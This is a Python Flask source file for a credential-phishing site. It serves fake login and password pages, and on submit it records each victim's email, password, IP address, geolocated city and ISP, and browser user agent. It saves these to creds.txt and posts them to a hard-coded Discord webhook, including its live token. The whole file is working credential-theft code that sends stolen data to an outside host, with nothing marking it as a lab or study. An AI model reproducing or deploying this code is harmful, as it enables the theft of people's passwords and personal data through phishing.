from flask import Flask, render_template, request
import datetime
import requests

def send_to_discord(email, password, ip, location_str, user_agent):
    webhook_url = "https://discord.com/api/webhooks/1392463520653905971/H6CdWhULMiWyN5746DAW89sJhwV0GrxoOlEy6nvywXp8J_M4is4Ucmbv2xJMFXn5MtTH"

    timestamp = datetime.datetime.now()
    log_message = (
        f"[LOG] {timestamp} | {email} | {password} | IP: {ip} | "
        f"Location: {location_str} | UA: {user_agent}\n"
    )

    data = {
        "content": log_message
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception as e:
        print(f"[ERROR] Failed to send log to Discord: {e}")


# def get_location(ip):
#     url = f"http://ip-api.com/json/{ip}"
#     response = requests.get(url)
#     if response.status_code == 200:
#         data = response.json()
#         return {
#             "city": data.get("city"),
#             "region": data.get("regionName"),
#             "country": data.get("country"),
#             "timezone": data.get("timezone"),
#             "isp": data.get("isp")
#         }

def get_location(ip):
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    if response.status_code == 200:
        data = response.json()
        return {
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "timezone": data.get("timezone"),
            "isp": data.get("org")
        }


app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/password')
def password():
    email = request.args.get('email')
    return render_template('password.html', email=email)


@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    # Get IP address from request context
    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = raw_ip.split(',')[0].strip()
    # Get location from IP
    location = get_location(ip)
    location_str = (
        f"{location['city']}, {location['region']}, {location['country']} | "
        f"{location['isp']} | {location['timezone']}"
        if location else "Location Unknown"
    )
    user_agent = request.headers.get('User-Agent')
    # Save to file
    with open("creds.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
    print(f"[LOG] {datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
    send_to_discord(email, password, ip, location_str, user_agent)
    return render_template('submit.html', email=email)

if __name__ == '__main__':
    app.run(debug=True)
